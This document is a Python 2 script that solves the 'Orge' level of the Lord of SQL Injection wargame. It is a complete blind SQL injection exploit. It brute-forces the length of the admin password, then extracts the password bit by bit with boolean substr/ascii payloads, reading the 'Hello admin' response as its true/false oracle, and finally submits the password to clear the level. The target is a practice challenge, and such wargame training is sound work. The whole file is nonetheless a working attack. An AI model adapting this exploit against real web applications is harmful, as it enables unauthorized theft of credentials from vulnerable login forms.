#!/usr/bin/python
# coding: utf-8

import requests
from sys import stdout

print("#### Lord of SQL Injection - Orge ####\n")

url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"

session = raw_input("Input your LOS session : ")
# session = "lqaa55h0s48l8h06rc9sguktt0"

headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}

password = ""
query = 0


# guess the length of password
for i in range(100):
    param = "?pw=' || id='admin' %26%26 length(pw)={0}%23".format(i)
    r = requests.get(url + param, headers=headers)
    query += 1

    if r.text.find("<h2>Hello admin</h2>") > 0:
        length = i
        print "[*] The length of 'pw' is {0}".format(i)
        break




print("\n\n#### Starting Blind SQL Injection ####\n")
for i in range(1, length + 1):
    binary = ''
    for j in range(0, 8):
        param = "?pw=' || id='admin' %26%26 (select substr(lpad(bin(ascii(substr(pw,{0},1))),7,0),{1},1)=1)%23".format(i, j)
        content = requests.get(url + param, headers=headers).text
        query += 1

        if content.find("Hello admin") > 0:
            binary += '1'
        else:
            binary += '0'

    password += chr(int(binary, 2))

    print chr(int(binary, 2)), "({0})".format(binary)
    stdout.flush()

print "\n[*] the password : ", password


url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=" + password
r = requests.get(url, headers=headers)

if r.text.find("<h2>ORGE Clear!</h2>") > 0:
    print "[*] message : Orge Clear!"
    
print "[*] total queries : {0}".format(query)